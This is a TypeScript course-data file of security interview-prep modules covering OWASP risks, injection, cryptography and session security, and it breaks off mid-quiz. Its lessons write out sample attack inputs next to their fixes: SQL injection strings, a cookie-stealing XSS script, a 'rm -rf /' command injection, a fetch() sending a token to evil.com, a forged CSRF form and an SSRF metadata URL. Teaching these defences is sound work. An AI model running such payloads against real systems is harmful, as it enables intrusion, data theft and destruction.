import type { Course } from '../courses'

const CC_SEC_OBJ = 'Master web application security, cryptography, threat modeling, secure code review, and penetration testing concepts so you can identify and fix vulnerabilities and pass any security engineering interview.'

export const crashInterviewSecurityCourses: Course[] = [
  {
    id: 'cc-interview-sec-m01', track: 'crash', title: 'Web Application Security Fundamentals',
    subtitle: 'OWASP Top 10, attack surfaces, threat modeling, and how to think like an attacker.',
    moduleObjective: 'Identify the OWASP Top 10 vulnerabilities, explain their root causes, and propose mitigations for each.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 1, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'OWASP Top 10', definition: 'The 10 most critical web application security risks, updated by the Open Web Application Security Project.' },
      { term: 'Attack Surface', definition: 'All the points where an attacker can try to enter, extract data, or disrupt the system.' },
      { term: 'Threat Model', definition: 'A structured analysis of who might attack, what assets they target, and how they might do it.' },
      { term: 'CIA Triad', definition: 'Confidentiality, Integrity, Availability — the three core goals of information security.' },
      { term: 'Defense in Depth', definition: 'Multiple independent security controls so that if one fails, others still protect the system.' },
      { term: 'Principle of Least Privilege', definition: 'Every component should have only the minimum access rights needed to perform its function.' },
      { term: 'Zero Trust', definition: 'Never trust, always verify — authenticate and authorize every request regardless of network location.' },
    ],
    content: `## Web Application Security Fundamentals

### OWASP Top 10 — know every one cold

\`\`\`
A01: Broken Access Control    ← #1 most common
  Root cause: Missing authorization checks
  Example: /api/users/123 returns data even for user 456
  Fix: Verify ownership on EVERY request: if (record.userId !== req.user.id) return 403

A02: Cryptographic Failures
  Root cause: Weak/missing encryption; secrets in plaintext
  Example: Storing passwords as MD5 hashes
  Fix: bcrypt/Argon2 for passwords; AES-256 at rest; TLS everywhere

A03: Injection (SQL, NoSQL, OS)
  Root cause: User input concatenated into queries
  Example: SELECT * FROM users WHERE email = '\${req.body.email}'
  Fix: Parameterized queries, ORM, input validation

A04: Insecure Design
  Root cause: Security not considered in architecture phase
  Fix: Threat modeling before development; security requirements

A05: Security Misconfiguration
  Root cause: Default creds, verbose error messages, open S3 buckets
  Fix: Hardened configs, least privilege, disable default accounts

A06: Vulnerable and Outdated Components
  Root cause: Outdated dependencies with known CVEs
  Fix: npm audit, Dependabot, regular updates

A07: Identification and Authentication Failures
  Root cause: Weak passwords, no MFA, session fixation
  Fix: Strong password policy, MFA, rotate session IDs on login

A08: Software and Data Integrity Failures
  Root cause: Unverified npm packages, CI/CD pipeline attacks
  Fix: Package integrity checks, signed releases, SAST in CI

A09: Security Logging and Monitoring Failures
  Root cause: No audit trail, unmonitored alerts
  Fix: Log auth events, rate limit violations, alert on anomalies

A10: SSRF (Server-Side Request Forgery)
  Root cause: Server fetches user-supplied URLs
  Example: fetch(req.body.webhookUrl) → attacker: http://169.254.169.254/
  Fix: Allowlist domains, block private IP ranges
\`\`\`

### Threat modeling framework (STRIDE)

\`\`\`
S — Spoofing:       Can an attacker impersonate a user or service?
T — Tampering:      Can data be modified in transit or at rest?
R — Repudiation:    Can an attacker deny performing an action?
I — Info Disclosure: Can sensitive data be exposed?
D — Denial of Service: Can the service be made unavailable?
E — Elevation of Privilege: Can an attacker gain more rights than granted?

Example: threat model for a login endpoint POST /auth/login

S: Brute force attack to guess credentials
   → Mitigation: Rate limiting, CAPTCHA, account lockout

T: Man-in-the-middle modifying credentials in transit
   → Mitigation: HTTPS/TLS everywhere

R: Attacker denies it was them who logged in
   → Mitigation: Log IP, user-agent, timestamp for all login attempts

I: Error message reveals whether email exists ("email not found" vs "wrong password")
   → Mitigation: Generic error: "Invalid credentials"

D: Flood login endpoint with requests
   → Mitigation: Rate limit by IP, by email, by fingerprint

E: Use login endpoint to test credentials from a breached database
   → Mitigation: Breach detection, notify users if credential stuffing detected
\`\`\`

### Security headers checklist

\`\`\`typescript
// Next.js next.config.js security headers
const headers = [
  { key: 'X-Frame-Options', value: 'DENY' },                    // prevent clickjacking
  { key: 'X-Content-Type-Options', value: 'nosniff' },          // prevent MIME sniffing
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'nonce-{NONCE}'",   // nonces for inline scripts
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "connect-src 'self' https://your-api.com",
    ].join('; '),
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains; preload',      // HSTS
  },
]
\`\`\``,
    quiz: [
      { q: 'A user can access /api/orders/456 even though order 456 belongs to a different user. Which OWASP category is this?', options: ['A03: Injection', 'A01: Broken Access Control', 'A07: Authentication Failures', 'A05: Security Misconfiguration'], correct: 1, explanation: 'Broken Access Control (A01) — the most common OWASP vulnerability. The API authenticated the user correctly but failed to verify the user is authorized to access that specific resource.' },
      { q: 'What is the difference between authentication and authorization?', options: ['They are the same thing', 'Authentication verifies who you are (identity); authorization verifies what you can do (permissions)', 'Authorization happens before authentication', 'Authentication is for APIs; authorization is for web pages'], correct: 1, explanation: 'Authentication: "Are you who you say you are?" (login, verify identity). Authorization: "Are you allowed to do this?" (check permissions). Both are required.' },
      { q: 'Why is returning "Email not found" vs "Wrong password" a security risk?', options: ['It confuses users', 'It reveals whether an email is registered, helping attackers in account enumeration or targeted phishing', 'It exposes password hashing algorithms', 'It violates GDPR'], correct: 1, explanation: 'Account enumeration: attackers can test thousands of emails to build a list of registered accounts. Return a generic "Invalid credentials" message for both cases.' },
      { q: 'What is a Server-Side Request Forgery (SSRF) attack?', options: ['An attacker forging server certificates', 'An attacker tricking a server into making HTTP requests to internal services or metadata APIs on their behalf', 'Forging server-side cookies', 'A type of SQL injection'], correct: 1, explanation: 'SSRF: attacker sends a URL like http://169.254.169.254/latest/meta-data/ (AWS metadata endpoint) as input. The server fetches it, exposing cloud credentials. Fix: allowlist domains, block private IP ranges.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Build a security audit function that scans code snippets for common vulnerabilities: SQL injection risk, hardcoded secrets, and missing input validation.',
      starterCode: `// Security code scanner
function auditCode(code) {
  const findings = []

  // TODO: Check 1 — SQL injection risk
  // Flag if code contains string concatenation with SQL keywords
  // Patterns: "SELECT" + variable, template literal with "WHERE" or "FROM"
  // Example: \`SELECT * FROM users WHERE id = \${userId}\`

  // TODO: Check 2 — Hardcoded secrets
  // Flag if code contains patterns like:
  // - password = "..."
  // - apiKey = "..."
  // - secret = "..."
  // - token = "..."
  // followed by a string literal (not process.env)

  // TODO: Check 3 — eval() usage
  // eval() with user input is extremely dangerous
  // Flag any eval( usage

  return findings
}

// Test cases
const vulnerable1 = \`
  const query = "SELECT * FROM users WHERE email = '" + email + "'"
  db.query(query)
\`

const vulnerable2 = \`
  const apiKey = "sk-prod-abc123xyz456"
  const secret = "my-jwt-secret-key"
\`

const vulnerable3 = \`
  const result = eval(userInput)
\`

const safe = \`
  const result = await db.from('users').select('*').eq('email', email)
  const apiKey = process.env.API_KEY
\`

console.log('vulnerable1 findings:', auditCode(vulnerable1))   // SQL injection
console.log('vulnerable2 findings:', auditCode(vulnerable2))   // hardcoded secrets
console.log('vulnerable3 findings:', auditCode(vulnerable3))   // eval
console.log('safe findings:', auditCode(safe))                 // []`,
      hints: [
        'For SQL injection: check if code.includes("SELECT") || code.includes("WHERE") and also uses string concatenation (+) or template literals with variable interpolation',
        'For hardcoded secrets: use regex like /\\b(password|apiKey|secret|token)\\s*=\\s*["\\\'`][^"\\\'`]{8,}/i',
        'For eval: simply check code.includes("eval(")',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m02', track: 'crash', title: 'Injection Attacks & Prevention',
    subtitle: 'SQL injection, XSS, CSRF, command injection — how each works and how to stop them.',
    moduleObjective: 'Explain and demonstrate SQL injection, XSS, and CSRF attacks and implement proper defenses for each.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 2, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'SQL Injection', definition: 'Inserting SQL code into user input that gets executed by the database — most critical web vulnerability historically.' },
      { term: 'Parameterized Query', definition: 'A query where user input is passed as separate parameters, never concatenated into the SQL string.' },
      { term: 'XSS', definition: 'Cross-Site Scripting — injecting malicious scripts into a web page viewed by other users.' },
      { term: 'CSRF', definition: 'Cross-Site Request Forgery — tricking a logged-in user\'s browser into making an unwanted request to a target site.' },
      { term: 'CSP', definition: 'Content Security Policy — HTTP header that restricts which scripts/resources a page can load, mitigating XSS.' },
      { term: 'SameSite Cookie', definition: 'Cookie attribute that restricts cross-site requests from sending the cookie — primary CSRF defense.' },
      { term: 'Input Sanitization', definition: 'Encoding or stripping dangerous characters from user input before rendering or using it.' },
    ],
    content: `## Injection Attacks & Prevention

### SQL Injection — how it works and how to fix it

\`\`\`typescript
// ✗ VULNERABLE — user input directly in SQL string
const email = req.body.email  // attacker sends: ' OR '1'='1
const query = \`SELECT * FROM users WHERE email = '\${email}'\`
// Becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns ALL users!

// More dangerous payload: ' ; DROP TABLE users; --
// Even worse: ' UNION SELECT username, password FROM admin_users --

// ✓ SAFE — parameterized query (Postgres)
const { rows } = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [req.body.email]  // email is data, never code
)

// ✓ SAFE — ORM (Supabase/Prisma handle parameterization)
const user = await supabase
  .from('users')
  .select('*')
  .eq('email', req.body.email)  // .eq() uses parameterized query internally
  .single()
\`\`\`

### XSS (Cross-Site Scripting) — three types

\`\`\`typescript
// 1. Stored XSS — malicious script saved to DB, served to all users
// Attacker stores: <script>document.cookie → attacker.com</script> as their "name"
// Fix: escape HTML on output

// ✗ VULNERABLE — renders raw HTML
function renderUserName(name: string) {
  container.innerHTML = name  // NEVER do this with user content
}

// ✓ SAFE — use textContent (automatically escapes)
function renderUserName(name: string) {
  container.textContent = name  // treats as text, not HTML
}

// ✓ SAFE — DOMPurify for rich text that MUST be HTML
import DOMPurify from 'dompurify'
container.innerHTML = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
  ALLOWED_ATTR: [],  // no href, onclick, etc.
})

// React is safe by default — JSX escapes all values
const UserName = ({ name }: { name: string }) => (
  <span>{name}</span>  // safe — React escapes automatically
)
// Only dangerous with dangerouslySetInnerHTML
\`\`\`

### CSRF — how it works and how to stop it

\`\`\`typescript
// ATTACK: attacker's site sends a request to YOUR site using victim's cookies
// Victim is logged into bank.com; attacker's page runs:
// <form action="https://bank.com/transfer" method="POST">
//   <input name="to" value="attacker-account">
//   <input name="amount" value="10000">
// </form>
// <script>document.forms[0].submit()</script>
// The victim's browser sends the bank's session cookie automatically!

// DEFENSE 1: SameSite cookie attribute (best defense)
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
// Strict: cookie NOT sent on cross-site requests
// Lax: cookie sent on GET but not POST cross-site

// DEFENSE 2: CSRF token
// 1. Server generates a random token and stores it in session
// 2. Token embedded in every form as a hidden field
// 3. Server validates token on every state-changing request

// DEFENSE 3: Custom request headers
// Attacker's form cannot set custom headers
// Your API requires: X-Requested-With: XMLHttpRequest
// Simple check that prevents form-based CSRF

// DEFENSE 4: Origin/Referer header validation
function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
  const origin = req.headers.origin
  const allowedOrigins = ['https://yourdomain.com']

  if (req.method !== 'GET' && !allowedOrigins.includes(origin ?? '')) {
    return res.status(403).json({ error: 'CSRF validation failed' })
  }
  next()
}
\`\`\`

### Command Injection

\`\`\`typescript
// ✗ VULNERABLE — user input in shell command
import { exec } from 'child_process'

// Attacker sends: filename = "file.pdf; rm -rf /"
exec(\`convert \${req.body.filename} output.png\`, callback)
// Becomes: convert file.pdf; rm -rf / output.png

// ✓ SAFE — pass arguments as array (no shell interpolation)
import { execFile } from 'child_process'

execFile('convert', [req.body.filename, 'output.png'], callback)
// execFile does NOT use a shell — arguments are passed directly

// Even safer: validate input first
const safeName = path.basename(req.body.filename)  // strip path traversal
if (!/^[a-zA-Z0-9._-]+$/.test(safeName)) {
  return res.status(400).json({ error: 'Invalid filename' })
}
\`\`\``,
    quiz: [
      { q: 'An attacker sends the input \' OR \'1\'=\'1 as a username. Why is this dangerous in a vulnerable login query?', options: ['It causes the server to crash', 'The injected SQL changes WHERE username = \'\' OR \'1\'=\'1\', which always evaluates to true and returns all users', 'It encrypts the database', 'It creates a new admin user'], correct: 1, explanation: 'The WHERE clause becomes always-true, bypassing authentication. The query returns the first user in the database (often admin). This is classic authentication bypass SQL injection.' },
      { q: 'React automatically prevents which type of XSS attack?', options: ['Stored XSS from the database', 'Reflected XSS in URL parameters', 'DOM XSS from dangerouslySetInnerHTML', 'XSS from JSX expressions — React escapes all values in curly braces'], correct: 3, explanation: 'React escapes all values in JSX expressions {value} — they are rendered as text, not HTML. The only React XSS vector is dangerouslySetInnerHTML, which you explicitly opt into.' },
      { q: 'Why does the SameSite=Strict cookie attribute prevent CSRF?', options: ['It encrypts the cookie value', 'It tells the browser not to send the cookie on requests initiated from other sites — the forged request has no valid session', 'It requires HTTPS for the cookie', 'It adds a digital signature to the cookie'], correct: 1, explanation: 'CSRF works because the browser automatically sends cookies with every request to the target domain. SameSite=Strict stops the browser from sending the cookie on cross-origin requests, so the forged request arrives with no session.' },
      { q: 'Why is execFile() safer than exec() for running system commands?', options: ['execFile() is faster', 'execFile() does not invoke a shell — arguments are passed directly without shell interpolation, preventing command injection', 'exec() doesn\'t work on Linux', 'execFile() validates file paths automatically'], correct: 1, explanation: 'exec() passes the string to a shell, which interprets special characters (;, |, $). An attacker can inject additional commands. execFile() calls the program directly — arguments are data, not code.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Write an escapeHtml function that prevents XSS by encoding the 5 dangerous HTML characters, then verify it handles common attack payloads.',
      starterCode: `// Implement HTML escaping to prevent XSS
// Must escape: & < > " '
// Mapping:
//   & → &amp;
//   < → &lt;
//   > → &gt;
//   " → &quot;
//   ' → &#x27;

function escapeHtml(unsafe) {
  // TODO: replace all 5 dangerous characters
  // Use replace with a regex or chain multiple replaces
  return unsafe
}

// Tests
const tests = [
  {
    input: '<script>alert("xss")</script>',
    expected: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;',
    name: 'script tag'
  },
  {
    input: '" onmouseover="alert(1)',
    expected: '&quot; onmouseover=&quot;alert(1)',
    name: 'attribute injection'
  },
  {
    input: "'; DROP TABLE users; --",
    expected: '&#x27;; DROP TABLE users; --',
    name: 'SQL in HTML context'
  },
  {
    input: 'Hello & <World>',
    expected: 'Hello &amp; &lt;World&gt;',
    name: 'ampersand and tags'
  },
  {
    input: 'safe text',
    expected: 'safe text',
    name: 'safe text unchanged'
  },
]

tests.forEach(({ input, expected, name }) => {
  const result = escapeHtml(input)
  const pass = result === expected
  console.log(pass ? '✓' : '✗', name)
  if (!pass) console.log('  Expected:', expected)
  if (!pass) console.log('  Got:     ', result)
})`,
      hints: [
        'Use a regex with the global flag: str.replace(/[&<>"\']/g, char => MAP[char])',
        'Build a MAP object: { "&": "&amp;", "<": "&lt;", ">": "&gt;", \'"\': "&quot;", "\'": "&#x27;" }',
        'Order matters if using chained replace: & must be first to avoid double-escaping',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m03', track: 'crash', title: 'Cryptography for Developers',
    subtitle: 'Hashing, encryption, JWT signing, TLS, and the crypto mistakes that cause real breaches.',
    moduleObjective: 'Choose the right cryptographic primitive for any security requirement and avoid common implementation errors.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 3, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'bcrypt', definition: 'A password hashing function with a built-in salt and work factor — designed to be slow to prevent brute force.' },
      { term: 'Salt', definition: 'Random data added to each password before hashing — prevents rainbow table attacks.' },
      { term: 'AES-256-GCM', definition: 'The recommended symmetric encryption algorithm — authenticated encryption providing both confidentiality and integrity.' },
      { term: 'RSA', definition: 'Asymmetric algorithm — a public key encrypts or verifies; a private key decrypts or signs.' },
      { term: 'HMAC', definition: 'Hash-based Message Authentication Code — a secret-key hash used to verify data integrity and authenticity.' },
      { term: 'TLS 1.3', definition: 'The current transport security standard — encrypts data in transit between client and server.' },
      { term: 'Key Derivation', definition: 'Deriving a cryptographic key from a password (PBKDF2, Argon2) — much stronger than hashing directly.' },
    ],
    content: `## Cryptography for Developers

### Password hashing — the only right way

\`\`\`typescript
import bcrypt from 'bcryptjs'

// ✗ WRONG — MD5 is fast and reversible with rainbow tables
const badHash = md5(password)  // cracks in seconds

// ✗ WRONG — SHA-256 without salt is fast (GPUs crack billions/sec)
const stillBad = sha256(password)

// ✓ CORRECT — bcrypt: slow by design, built-in salt
const ROUNDS = 12  // ~250ms per hash — adjust for your server

async function hashPassword(plaintext: string): Promise<string> {
  return bcrypt.hash(plaintext, ROUNDS)
  // Returns: $2b$12$[22-char salt][31-char hash]
  // Salt is embedded in the output — no need to store separately!
}

async function verifyPassword(plaintext: string, hash: string): Promise<boolean> {
  return bcrypt.compare(plaintext, hash)
  // Extracts salt from stored hash, rehashes plaintext, compares
}

// Argon2id is even better (winner of Password Hashing Competition):
import argon2 from 'argon2'
const hash = await argon2.hash(password)
const valid = await argon2.verify(hash, password)
\`\`\`

### Symmetric encryption (AES-256-GCM)

\`\`\`typescript
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'

const ALGORITHM = 'aes-256-gcm'
const KEY_LENGTH = 32  // 256 bits

// Key should come from environment, not hardcoded
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex')  // 32 bytes

function encrypt(plaintext: string): { iv: string; ciphertext: string; tag: string } {
  const iv = randomBytes(12)  // GCM standard IV length
  const cipher = createCipheriv(ALGORITHM, KEY, iv)

  const encrypted = Buffer.concat([
    cipher.update(plaintext, 'utf8'),
    cipher.final(),
  ])

  return {
    iv: iv.toString('hex'),
    ciphertext: encrypted.toString('hex'),
    tag: cipher.getAuthTag().toString('hex'),  // authentication tag
  }
}

function decrypt(iv: string, ciphertext: string, tag: string): string {
  const decipher = createDecipheriv(
    ALGORITHM,
    KEY,
    Buffer.from(iv, 'hex')
  )
  decipher.setAuthTag(Buffer.from(tag, 'hex'))  // verifies integrity

  return Buffer.concat([
    decipher.update(Buffer.from(ciphertext, 'hex')),
    decipher.final(),
  ]).toString('utf8')
}
\`\`\`

### JWT signing and verification

\`\`\`typescript
import jwt from 'jsonwebtoken'

const JWT_SECRET = process.env.JWT_SECRET!  // must be 256+ bits random

// Signing
function createToken(userId: string, role: string) {
  return jwt.sign(
    { sub: userId, role },
    JWT_SECRET,
    {
      expiresIn: '15m',      // short-lived access token
      algorithm: 'HS256',    // HMAC-SHA256 for symmetric signing
      issuer: 'academy.jsupremeconglomerate.online',
      audience: 'academy-users',
    }
  )
}

// Verification — ALWAYS verify before trusting
function verifyToken(token: string): { sub: string; role: string } {
  try {
    const payload = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],   // explicitly specify — prevent algorithm confusion attack
      issuer: 'academy.jsupremeconglomerate.online',
      audience: 'academy-users',
    })
    return payload as { sub: string; role: string }
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) throw new Error('Token expired')
    if (err instanceof jwt.JsonWebTokenError) throw new Error('Invalid token')
    throw err
  }
}
\`\`\`

### Common crypto mistakes

\`\`\`
1. ECB mode encryption (same block → same ciphertext, leaks patterns)
   Fix: Always use GCM or CBC with random IV

2. Static IV (initialization vector)
   Fix: Generate fresh random IV for EVERY encryption operation

3. JWT algorithm confusion: alg: "none" or switching HS256↔RS256
   Fix: Always specify allowed algorithms in verify()

4. Storing raw passwords in logs
   Fix: Never log sensitive fields; use a denylist in your logger

5. Weak random: Math.random() for security tokens
   Fix: Use crypto.randomBytes() or crypto.randomUUID()
\`\`\``,
    quiz: [
      { q: 'Why is MD5 unacceptable for password storage?', options: ['MD5 is not supported by modern databases', 'MD5 is fast — GPUs can compute billions per second, and rainbow table databases pre-compute MD5 hashes for common passwords', 'MD5 hashes are too short', 'MD5 doesn\'t support special characters'], correct: 1, explanation: 'Password hashing needs to be SLOW to prevent brute force. MD5 is a general-purpose hash designed to be fast. Modern GPUs crack MD5 passwords at billions per second. bcrypt/Argon2 are designed to be slow and costly to brute-force.' },
      { q: 'What is the purpose of a salt in password hashing?', options: ['To encrypt the hash', 'To make the hash longer', 'A unique random value added per password to ensure identical passwords produce different hashes, defeating rainbow tables', 'To store the password securely'], correct: 2, explanation: 'Without a salt, "password123" always hashes to the same value. An attacker can precompute hashes for common passwords (rainbow table) and look up your stolen hashes instantly. A unique salt makes each hash unique.' },
      { q: 'An attacker modifies the JWT header to use alg: "none". What vulnerability does this exploit?', options: ['SQL injection via JWT', 'Algorithm confusion — some JWT libraries accept "none" as a valid algorithm and skip signature verification entirely', 'Padding oracle attack', 'Timing side channel'], correct: 1, explanation: 'Some JWT libraries originally accepted alg: "none", meaning no signature required. An attacker could modify the payload and create a valid token. Fix: always specify allowed algorithms: algorithms: ["HS256"].' },
      { q: 'What makes AES-256-GCM preferable to AES-256-CBC?', options: ['GCM is faster', 'GCM provides authenticated encryption — it also verifies the ciphertext hasn\'t been tampered with (via the authentication tag)', 'CBC is not supported in Node.js', 'GCM uses a longer key'], correct: 1, explanation: 'GCM (Galois/Counter Mode) is AEAD (Authenticated Encryption with Associated Data). The authentication tag detects tampering. CBC only provides confidentiality — an attacker could modify ciphertext and you wouldn\'t detect it.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement a secure token generator for password reset tokens — must use cryptographically secure random bytes, be URL-safe, and have an expiry check.',
      starterCode: `const crypto = require('crypto')

// In-memory store for demo (use Redis/DB in production)
const tokenStore = new Map()

// TODO: implement generateResetToken(userId)
// - Generate 32 cryptographically random bytes
// - Encode as hex string (URL-safe)
// - Store in tokenStore: { userId, expiresAt: now + 15 min }
// - Return the token string
function generateResetToken(userId) {

}

// TODO: implement verifyResetToken(token)
// - Look up token in tokenStore
// - If not found: return { valid: false, reason: 'not found' }
// - If expired: return { valid: false, reason: 'expired' }
// - If valid: return { valid: true, userId }
// - Tokens should be single-use — delete after verification
function verifyResetToken(token) {

}

// Tests
const token = generateResetToken('user-123')
console.log('Token length:', token.length)     // 64 chars (32 bytes hex)
console.log('Token sample:', token.slice(0, 8) + '...')

const result1 = verifyResetToken(token)
console.log('Valid token:', result1)            // { valid: true, userId: 'user-123' }

const result2 = verifyResetToken(token)
console.log('Used again:', result2)             // { valid: false, reason: 'not found' } (single-use)

const badResult = verifyResetToken('fake-token')
console.log('Fake token:', badResult)           // { valid: false, reason: 'not found' }`,
      hints: [
        'crypto.randomBytes(32).toString("hex") generates 64-char hex string',
        'expiresAt = Date.now() + 15 * 60 * 1000 (15 minutes in ms)',
        'In verifyResetToken: check tokenStore.has(token), then check Date.now() > entry.expiresAt, then tokenStore.delete(token) before returning valid',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m04', track: 'crash', title: 'Authentication & Session Security',
    subtitle: 'OAuth 2.0, session fixation, cookie security, MFA implementation, and token storage best practices.',
    moduleObjective: 'Design a secure authentication system with proper session management, token storage, and MFA.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 4, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'OAuth 2.0', definition: 'An authorization framework that lets users grant limited access to their resources on one site to another site.' },
      { term: 'PKCE', definition: 'Proof Key for Code Exchange — prevents authorization code interception in public clients (SPAs, mobile apps).' },
      { term: 'Session Fixation', definition: 'An attack where an adversary pre-sets a known session ID; the victim logs in and the attacker hijacks their session.' },
      { term: 'MFA', definition: 'Multi-Factor Authentication — requires two or more proof factors: something you know, have, or are.' },
      { term: 'TOTP', definition: 'Time-based One-Time Password (Google Authenticator) — a 6-digit code valid for 30 seconds, derived from a shared secret and current time.' },
      { term: 'Token Storage', definition: 'Where to store auth tokens in the browser: HttpOnly cookies (recommended) vs localStorage (XSS vulnerable).' },
      { term: 'Credential Stuffing', definition: 'Using leaked username/password pairs from one breach to try logging into other services.' },
    ],
    content: `## Authentication & Session Security

### Token storage — the definitive answer

\`\`\`
localStorage / sessionStorage:
  ✓ Easy to use
  ✗ XSS can steal tokens: fetch('https://evil.com', { body: localStorage.getItem('token') })
  ✗ Accessible to any JavaScript on the page
  ✗ NOT recommended for JWTs

HttpOnly Cookie:
  ✓ JavaScript cannot read it — XSS proof
  ✓ Sent automatically by browser
  ✓ Works with same-site policies
  ✗ Requires CSRF protection (SameSite=Strict or CSRF token)
  ✓ RECOMMENDED for sensitive tokens

Memory (React state, closures):
  ✓ Not accessible to XSS
  ✗ Lost on page refresh — need silent refresh via HttpOnly refresh token
  ✓ Good for access tokens with short TTL

Best practice:
  - Access token: in memory (15 min TTL)
  - Refresh token: HttpOnly Secure SameSite=Strict cookie (7 day TTL)
  - On page load: call /auth/refresh to get new access token from cookie
\`\`\`

### OAuth 2.0 with PKCE (for SPAs)

\`\`\`typescript
// Step 1: Generate PKCE parameters
function generateCodeVerifier(): string {
  return crypto.randomUUID().replace(/-/g, '') + crypto.randomUUID().replace(/-/g, '')
}

async function generateCodeChallenge(verifier: string): Promise<string> {
  const data = new TextEncoder().encode(verifier)
  const digest = await crypto.subtle.digest('SHA-256', data)
  return btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '')
}

// Step 2: Redirect to authorization server
async function initiateOAuth(provider: 'google' | 'github') {
  const verifier = generateCodeVerifier()
  const challenge = await generateCodeChallenge(verifier)
  const state = crypto.randomUUID()  // CSRF protection for OAuth

  sessionStorage.setItem('pkce_verifier', verifier)  // store temporarily
  sessionStorage.setItem('oauth_state', state)

  const params = new URLSearchParams({
    response_type: 'code',
    client_id: process.env.NEXT_PUBLIC_OAUTH_CLIENT_ID!,
    redirect_uri: 'https://yourapp.com/auth/callback',
    scope: 'openid email profile',
    code_challenge: challenge,
    code_challenge_method: 'S256',
    state,
  })

  window.location.href = \`https://accounts.google.com/o/oauth2/v2/auth?\${params}\`
}

// Step 3: Handle callback
async function handleCallback(code: string, returnedState: string) {
  const savedState = sessionStorage.getItem('oauth_state')
  if (returnedState !== savedState) throw new Error('State mismatch — possible CSRF')

  const verifier = sessionStorage.getItem('pkce_verifier')
  sessionStorage.removeItem('pkce_verifier')
  sessionStorage.removeItem('oauth_state')

  // Exchange code for tokens (server-side for security)
  const response = await fetch('/api/auth/token', {
    method: 'POST',
    body: JSON.stringify({ code, verifier }),
  })
  return response.json()
}
\`\`\`

### TOTP MFA implementation

\`\`\`typescript
import { authenticator } from 'otplib'
import QRCode from 'qrcode'

// Generate TOTP secret for a user
async function setupMFA(userId: string, email: string) {
  const secret = authenticator.generateSecret()  // 20-byte base32 encoded

  // Store encrypted in DB (not plaintext!)
  await db.users.update({
    where: { id: userId },
    data: { mfaSecret: encrypt(secret), mfaPending: true },  // not active until verified
  })

  // Generate QR code URI for authenticator apps
  const otpauthUrl = authenticator.keyuri(email, 'JS Academy', secret)
  const qrCode = await QRCode.toDataURL(otpauthUrl)

  return { qrCode, secret }  // user scans QR code
}

// Verify TOTP during login
async function verifyMFA(userId: string, code: string): Promise<boolean> {
  const user = await db.users.findUnique({ where: { id: userId } })
  if (!user.mfaSecret) return false

  const secret = decrypt(user.mfaSecret)

  // otplib checks current window ± 1 step (30s ± 30s = 90s window for clock skew)
  return authenticator.verify({ token: code, secret })
}
\`\`\`

### Session fixation prevention

\`\`\`typescript
// Always rotate session ID on login
async function login(email: string, password: string, req: Request, res: Response) {
  const user = await validateCredentials(email, password)
  if (!user) return res.status(401).json({ error: 'Invalid credentials' })

  // CRITICAL: regenerate session ID after successful login
  // Prevents session fixation attack
  req.session.regenerate(async (err) => {
    if (err) throw err

    req.session.userId = user.id
    req.session.loginAt = new Date()

    // Rotate refresh token on login too
    const refreshToken = await createRefreshToken(user.id)
    res.cookie('refresh_token', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
    })

    res.json({ user: { id: user.id, email: user.email } })
  })
}
\`\`\``,
    quiz: [
      { q: 'Why is storing JWT access tokens in localStorage a security risk?', options: ['localStorage is too slow', 'Any JavaScript on the page (including injected via XSS) can read localStorage — a single XSS vulnerability exposes all stored tokens', 'localStorage doesn\'t persist across sessions', 'JWT tokens are too large for localStorage'], correct: 1, explanation: 'XSS attacks inject JavaScript into your page. If tokens are in localStorage, a single XSS flaw means attackers can steal tokens with fetch(). HttpOnly cookies cannot be read by JavaScript regardless of XSS.' },
      { q: 'What is session fixation and how do you prevent it?', options: ['A session that never expires', 'An attacker pre-sets a known session ID; the victim logs in and the attacker uses that ID to impersonate them — prevented by regenerating the session ID on login', 'A session that is shared between users', 'Fixing broken session middleware'], correct: 1, explanation: 'An attacker sends a victim a link with a known session ID. The victim logs in — but uses that attacker-known ID. The attacker is now authenticated as the victim. Fix: always call session.regenerate() immediately after login.' },
      { q: 'What does the "state" parameter in OAuth 2.0 flows protect against?', options: ['It speeds up the authorization flow', 'CSRF attacks — the state is a random value the client generates and verifies on callback to ensure the response is for the request it initiated', 'It identifies which user is logging in', 'It selects the authorization server endpoint'], correct: 1, explanation: 'Without state, an attacker could send a victim to the OAuth callback URL with an attacker-controlled code, linking the victim\'s account to the attacker\'s identity. State verification prevents this.' },
